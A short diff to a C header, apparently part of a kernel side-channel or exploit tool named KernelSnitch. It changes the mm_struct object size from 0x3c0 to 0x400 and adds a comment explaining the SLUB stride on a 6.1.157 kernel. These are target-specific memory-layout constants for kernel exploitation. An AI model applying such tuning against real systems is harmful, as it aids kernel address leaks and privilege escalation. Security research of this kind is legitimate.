@@ -46,7 +46,12 @@
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
 #define SKB_DATA_DELTA (-0x1000LL)
-#define MM_STRUCT_SZ 0x3c0
+/*
+ * The target BTF reports sizeof(struct mm_struct) == 0x3c0, but on this
+ * 6.1.157 configuration the mm_struct SLUB objects occupy a 0x400-byte
+ * stride, so the KernelSnitch candidate walk has to use 0x400.
+ */
+#define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
 #define KERNELSNITCH_MTE_ENABLED 1
 #define KERNELSNITCH_VERBOSE 1
